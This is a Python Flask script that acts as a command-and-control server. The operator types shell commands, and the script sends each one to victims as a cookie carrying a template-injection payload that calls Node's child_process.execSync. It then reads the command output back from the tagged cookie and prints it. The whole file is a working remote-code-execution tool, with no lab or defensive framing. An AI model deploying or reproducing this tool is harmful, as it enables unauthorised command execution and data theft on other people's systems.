import threading
import time
import base64
from flask import Flask, request, make_response

# --- Configuration ---
HOST = '0.0.0.0'
PORT = 5000
app = Flask(__name__)

# Global variable 
current_command = "whoami" 
tag = 'd850707302a64e5489f27de4f95ec8bd'

def get_encoded_Command(value):

    return base64.b64encode(value.encode()).decode()

# --- FLASK SERVER ENDPOINT ---
@app.route('/', methods=['GET'])
def endpoint():
    # Use 'global' to access and read the latest 'current_command' value from the main thread
    global current_command
    

    Output = request.cookies.get(tag)
    
    if Output is not None:
        try:
            
            Output_decoded = base64.b64decode(Output.encode()).decode()
            print(f'\n[SERVER] Received Output of command {current_command} : {Output_decoded}')
            

        except Exception as e:
            print(f'[SERVER] Error decoding Output: {e}')
            
    # 2. SET Outgoing Command 

    new_Command_value = current_command
        
    encoded_Command = get_encoded_Command(new_Command_value)
    
    # Create a proper Flask response object
    resp = make_response('Hello, world! (Command updated)')
    
    # Set the Command on the response
    resp.set_cookie(
        tag,
        ('''{{range.constructor('return btoa(require'''
        '''("child_process").execSync(atob("''' +
        encoded_Command +
        '''")))')()}}'''),
        path='/'
    )
    
    return resp

def run_flask_app():
    app.run(host=HOST, port=PORT, debug=False, use_reloader=False)

def main_control_loop():

    # Use 'global' to modify the 'current_command' variable
    global current_command
    
    server_thread = threading.Thread(target=run_flask_app, daemon=True)
    server_thread.start()
    
    # Wait briefly for the server to start
    time.sleep(1)
    
    print("-" * 50)
    print(f"Server Running (http://{HOST}:{PORT})")
    print("Enter a new Command value to transmit to the client.")
    print("Type 'EXIT' or 'QUIT' to stop the server.")
    print("-" * 50)

    while True:
        try:
            # Get user input for the new Command value
            new_cook = input(f"Current Command: '{current_command}'\n> New Command: ")
            
            if new_cook.upper() in ['EXIT', 'QUIT']:
                print("\nShutting down console...")
                break
            
            # Check if input is not just whitespace
            if new_cook.strip():
                # Update the global variable
                current_command = new_cook.strip()
                print(f"[UPDATED] New Command state to: '{current_command}'")
            else:
                print("[INFO] Command state unchanged.")
                
        except EOFError:
            print("\nShutting down on EOF...")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            break
            
    time.sleep(1)
    print("Program terminated.")

if __name__ == '__main__':
    main_control_loop()
